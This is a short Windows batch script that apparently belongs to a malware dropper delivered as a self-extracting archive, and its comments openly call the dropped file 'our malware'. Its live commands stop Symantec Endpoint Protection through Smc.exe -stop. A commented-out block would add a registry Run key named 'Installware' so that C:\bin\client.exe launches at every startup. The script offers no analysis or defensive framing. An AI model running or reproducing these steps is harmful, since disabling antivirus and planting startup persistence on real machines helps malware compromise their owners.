:: Shut down the antivirus
cd "C:\Program Files (x86)\Symantec\Symantec Endpoint Protection"
Smc.exe -stop


:: If was not specified the startup folder in the self extracting moudul settings as the extraction folder, it is possible to add the client.exe among the programs launched at startup only adding a regisrty key.
:: In this case C:\bin\client.exe is the path where it was extracted our malware
::reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Installware
::if %errorlevel% NEQ 0 (
::	reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Installware /d C:\bin\client.exe    
::) 
